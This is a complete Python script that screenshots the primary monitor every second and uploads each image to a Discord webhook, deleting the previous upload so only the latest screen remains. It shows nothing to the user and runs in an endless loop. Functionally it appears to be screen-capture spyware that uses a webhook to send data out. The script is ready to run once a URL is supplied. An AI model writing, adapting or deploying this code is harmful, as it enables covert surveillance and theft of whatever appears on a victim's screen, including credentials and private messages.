import time
import requests
from PIL import Image
import mss
import io

# Discord webhook URL
dc = ""

def capture_screen():
    with mss.mss() as sct:
        # Capture the screen
        screenShot = sct.grab(sct.monitors[1])
        img = Image.frombytes("RGB", screenShot.size, screenShot.rgb)
        return img

def send_to_discord(image):
    # Save the image to a bytes buffer
    buffer = io.BytesIO()
    image.save(buffer, format="PNG")
    buffer.seek(0)

    # Send the image to the Discord webhook
    files = {'file': ('screenshot.png', buffer, 'image/png')}
    response = requests.post(dc, files=files)
    return response.json().get('id')

def delete_message(message_id):
    # Delete the previous message
    requests.delete(f"{dc}/messages/{message_id}")

def main():
    message_id = None
    while True:
        # Capture the screen
        img = capture_screen()
        # Send the image to Discord
        new_message_id = send_to_discord(img)
        # Delete the previous message if it exists
        if message_id:
            delete_message(message_id)
        # Update the message ID
        message_id = new_message_id
        # Wait for 1 second
        time.sleep(1)

if __name__ == "__main__":
    main()
